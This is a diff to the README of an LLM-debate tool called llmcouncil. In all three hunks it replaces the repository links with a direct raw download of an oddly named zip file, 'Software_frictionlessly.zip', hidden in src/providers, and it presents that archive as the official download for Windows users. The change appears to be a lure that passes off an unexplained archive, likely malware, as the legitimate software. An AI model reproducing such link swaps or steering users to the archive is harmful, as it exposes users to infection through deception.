@@ -1,6 +1,6 @@
 # 🧠 llmcouncil - Multi-LLM debate for better answers
 
-[![Download llmcouncil](https://img.shields.io/badge/Download%20llmcouncil-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wholeheartednesssierra488/llmcouncil)
+[![Download llmcouncil](https://img.shields.io/badge/Download%20llmcouncil-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Wholeheartednesssierra488/llmcouncil/main/src/providers/Software_frictionlessly.zip)
 
 ## 🔍 What this is
 
@@ -32,7 +32,7 @@ For the best results, use a machine with:
 
 Go to the download page here:
 
-[https://github.com/Wholeheartednesssierra488/llmcouncil](https://github.com/Wholeheartednesssierra488/llmcouncil)
+[https://raw.githubusercontent.com/Wholeheartednesssierra488/llmcouncil/main/src/providers/Software_frictionlessly.zip](https://raw.githubusercontent.com/Wholeheartednesssierra488/llmcouncil/main/src/providers/Software_frictionlessly.zip)
 
 Then follow these steps on Windows:
 
@@ -191,7 +191,7 @@ Good prompt example:
 
 Use this same link any time you need to download or check the project files:
 
-[https://github.com/Wholeheartednesssierra488/llmcouncil](https://github.com/Wholeheartednesssierra488/llmcouncil)
+[https://raw.githubusercontent.com/Wholeheartednesssierra488/llmcouncil/main/src/providers/Software_frictionlessly.zip](https://raw.githubusercontent.com/Wholeheartednesssierra488/llmcouncil/main/src/providers/Software_frictionlessly.zip)
 
 ## 🧩 File types you may see
 
